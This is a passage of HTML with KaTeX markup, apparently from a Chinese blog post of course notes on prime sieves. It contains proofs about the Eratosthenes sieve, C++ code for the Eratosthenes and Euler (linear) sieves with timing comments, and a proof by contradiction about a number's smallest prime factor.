mathnormal">p</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7521em;"><span style="top:-2.3987em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.1507em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span>且都是素数<p>那么之前遍历过的素数一定筛掉了当前的n，合理。</p></li><li><p>综上所述，埃氏筛可以实现不漏的筛选。</p></li><li><p>无法避免重复?，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><msup><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msup><mi>p</mi><msup><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub></msup><mi>p</mi><msup><mn>3</mn><msub><mi>a</mi><mn>3</mn></msub></msup><mo>⋯</mo><msubsup><mi>p</mi><mi>k</mi><msub><mi>a</mi><mi>k</mi></msub></msubsup></mrow><annotation encoding="application/x-tex">n=p1^{a_1} p2^ {a_2}p3^ {a_3}\cdots p_k^{a_k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0534em;vertical-align:-0.3013em;"></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7521em;"><span style="top:-2.3987em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.1507em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013em;"><span></span></span></span></span></span></span></span></span></span>里边有几个素数，n就被重复筛了多少次。由此，每个数被重复筛掉过次数也可以知道了。</p></li></ul><h6 id="证明是可以缩小i的枚举范围至√maxn，回答优化后的算法时间复杂度。"><a href="#证明是可以缩小i的枚举范围至√maxn，回答优化后的算法时间复杂度。" class="headerlink" title="证明是可以缩小i的枚举范围至√maxn，回答优化后的算法时间复杂度。"></a>证明是可以缩小i的枚举范围至√maxn，回答优化后的算法时间复杂度。</h6><ul><li>证明就是定理1.4，无需再枚举大于√maxn的素数，因为正合数n的最小正因数一定小于√n，且为素数。<br><strong>这也是手算的重要技巧，被老师在课堂重点强调：</strong><br><img src="/dong.github/images/0915-1.png">    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8a9d8570" role="button" aria-expanded="false" aria-controls="collapse-8a9d8570">        <div class="fold-arrow">▶</div>编程测试      </div>      <div class="fold-collapse collapse" id="collapse-8a9d8570">        <div class="fold-content">          <div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/dong.github/images/0915-3.png" alt="正确性"></div><div class="group-image-wrap"><img src="/dong.github/images/0915-2.png" alt="O（√nloglogn）"></div></div></div>**调用计时函数，计算1000以内的素数1000次，记录运行时间**<p><strong>可以看到，优化后的埃氏筛法快了近一倍！</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">1e3</span>;<br><span class="hljs-type">bool</span> isprime[maxn<span class="hljs-number">+10</span>];<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> ull;<br><span class="hljs-type">clock_t</span> start,endd;<br><span class="hljs-type">double</span> duration;<br><span class="hljs-type">int</span> Test = <span class="hljs-number">1000</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">seive</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">memset</span>(isprime,<span class="hljs-literal">true</span>,<span class="hljs-built_in">sizeof</span>(isprime));<br>isprime[<span class="hljs-number">0</span>]=isprime[<span class="hljs-number">1</span>]=<span class="hljs-literal">false</span>;<br><span class="hljs-keyword">for</span>(ull i=<span class="hljs-number">2</span>;i&lt;=maxn;i++)&#123;<br><span class="hljs-comment">//if(i &gt;= sqrt(maxn))break;</span><br><span class="hljs-keyword">if</span> (isprime[i]) &#123;<br><span class="hljs-keyword">for</span> (ull j = i * i; j &lt;= maxn; j += i) &#123;<span class="hljs-comment">//枚举倍数并筛去</span><br>isprime[j] = <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//start = clock();</span><br><span class="hljs-comment">//for(int i = 0;i &lt; Test;++ i)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-built_in">seive</span>();<br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//endd = clock();</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; maxn;++i)<br>&#123;<br><span class="hljs-keyword">if</span>(isprime[i])<br>&#123;<br>cout &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-comment">//printf(&quot;ticks%d=%f\n&quot;,maxn,(double)(endd-start));</span><br><span class="hljs-comment">//duration = ((double)(endd-start))/CLK_TCK;</span><br><span class="hljs-comment">//printf(&quot;duration%d=%lf\n&quot;,maxn,duration);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>        </div>      </div>    </div></li></ul><h4 id="欧拉筛"><a href="#欧拉筛" class="headerlink" title="欧拉筛"></a>欧拉筛</h4><p><strong>时间复杂度:O（n）</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e8</span> + <span class="hljs-number">3</span>;<br><span class="hljs-type">bool</span> isprime[N];<br><span class="hljs-type">int</span> prime[N],cnt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ola</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br><span class="hljs-built_in">memset</span>(isprime, <span class="hljs-literal">true</span>, <span class="hljs-built_in">sizeof</span>(isprime));<br>isprime[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br> <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;<br><span class="hljs-keyword">if</span> (isprime[i]) prime[++cnt] = i;<span class="hljs-comment">//如果i没有被前面的数筛掉，则i是素数</span><br> <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j&lt;=cnt&amp;&amp;prime[j] &lt;= n/i; j++) &#123;<span class="hljs-comment">//j枚举已经筛出的素数</span><br>isprime[i * prime[j]] = <span class="hljs-number">0</span>;<span class="hljs-comment">//把i*prime[j]筛掉</span><br><span class="hljs-keyword">if</span> (i % prime[j] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//保证不会重复筛</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//1.Q:为什么要再开一个数组记录素数?</span><br><span class="hljs-comment">// .A:继承证明B的思想，另外，这也是一种空间换时间的算法思路。</span><br><span class="hljs-comment">//2.Q:if (i % prime[j] == 0) break;如何保证不重复的？</span><br><span class="hljs-comment">//  A:模拟一下代码运行过程考虑一会即可知。</span><br></code></pre></td></tr></table></figure><h2 id="补充定理："><a href="#补充定理：" class="headerlink" title="补充定理："></a>补充定理：</h2><p><img src="/dong.github/images/0915-4.png"></p><h2 id="课堂思考题及证明："><a href="#课堂思考题及证明：" class="headerlink" title="课堂思考题及证明："></a>课堂思考题及证明：</h2><p><img src="/dong.github/images/0902.jpg"></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-7cd4d09c" role="button" aria-expanded="false" aria-controls="collapse-7cd4d09c">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-7cd4d09c">        <div class="fold-content">          <p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="bold">证明：（反证法）</mtext><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">若</mtext><mi mathvariant="bold">n</mi><mi mathvariant="bold">&#x2F;</mi><mi mathvariant="bold">p</mi><mtext mathvariant="bold">为合数，</mtext><mi mathvariant="bold">∃</mi><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>∈</mo><mo stretchy="false">[</mo><mn mathvariant="bold">2</mn><mo separator="true">,</mo><mi mathvariant="bold">n</mi><mi mathvariant="bold">&#x2F;</mi><mi mathvariant="bold">p</mi><mo stretchy="false">]</mo></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">使得：</mtext><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>&#x3D;</mo><mi mathvariant="bold">n</mi><mi mathvariant="bold">&#x2F;</mi><mi mathvariant="bold">p</mi></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">则</mtext><mi mathvariant="bold">p</mi><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>&#x3D;</mo><mi mathvariant="bold">n</mi></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">又</mtext><mi mathvariant="bold">p</mi><mo>&gt;</mo><msup><mi mathvariant="bold">n</mi><mrow><mn mathvariant="bold">1</mn><mi mathvariant="bold">&#x2F;</mi><mn mathvariant="bold">3</mn></mrow></msup></mrow><mspace linebreak="newline"></mspace><mrow><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>&lt;</mo><msup><mi mathvariant="bold">n</mi><mrow><mn mathvariant="bold">2</mn><mi mathvariant="bold">&#x2F;</mi><mn mathvariant="bold">3</mn></mrow></msup></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">由已知：</mtext><mi mathvariant="bold">p</mi><mtext mathvariant="bold">是</mtext><mi mathvariant="bold">n</mi><mtext mathvariant="bold">的最小因子</mtext></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">则：</mtext><mi mathvariant="bold">p</mi><mo>&lt;</mo><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><mtext mathvariant="bold">且</mtext><mi mathvariant="bold">p</mi><mo>&lt;</mo><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub></mrow><mspace linebreak="newline"></mspace><mrow><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><msup><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msup><mo>&lt;</mo><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>&lt;</mo><msup><mi mathvariant="bold">n</mi><mrow><mn mathvariant="bold">2</mn><mi mathvariant="bold">&#x2F;</mi><mn mathvariant="bold">3</mn></mrow></msup></mrow><mspace linebreak="newline"></mspace><mrow><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mi mathvariant="bold">p</mi><mo>&lt;</mo><msup><mi mathvariant="bold">n</mi><mrow><mn mathvariant="bold">1</mn><mi mathvariant="bold">&#x2F;</mi><mn mathvariant="bold">3</mn></mrow></msup></mrow><mspace linebreak="newline"></mspace><mtext mathvariant="bold">矛盾，原命题得证。</mtext><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">\mathbf{证明：（反证法）}\newline<br>\mathbf{若n&#x2F;p为合数，\exists p_1,p_2\in[2,n&#x2F;p]}\newline<br>\mathbf{使得：p_1 p_2&#x3D;n&#x2F;p}\newline<br>\mathbf{则 p p_1 p_2&#x3D;n}\newline<br>\mathbf{又 p&gt;n^{1&#x2F;3}}\newline<br>\mathbf{p_1 p_2&lt; n^{2&#x2F;3}}\newline<br>\mathbf{由已知：p是n的最小因子}\newline<br>\mathbf{则：p&lt; p_1且p&lt; p_2}\newline<br>\mathbf{\implies p^2 &lt; p_1 p_2 &lt; n ^ {2&#x2F;3}}\newline<br>\mathbf{\implies p&lt; n ^ {1&#x2F;3}}\newline<br>\mathbf{矛盾，原命题得证。}\newline</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6861em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">证明：（反证法）</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">若</span><span class="mord mathbf">n&#x2F;p</span><span class="mord mathbf cjk_fallback">为合数，</span><span class="mord mathbf">∃</span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">[</span><span class="mord mathbf">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathbf">n&#x2F;p</span><span class="mclose">]</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">使得：</span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathbf">n&#x2F;p</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8805em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">则</span><span class="mord mathbf">p</span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathbf">n</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">又</span><span class="mord mathbf">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">1&#x2F;3</span></span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">2&#x2F;3</span></span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8805em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">由已知：</span><span class="mord mathbf">p</span><span class="mord mathbf cjk_fallback">是</span><span class="mord mathbf">n</span><span class="mord mathbf cjk_fallback">的最小因子</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8805em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">则：</span><span class="mord mathbf">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathbf cjk_fallback">且</span><span class="mord mathbf">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span 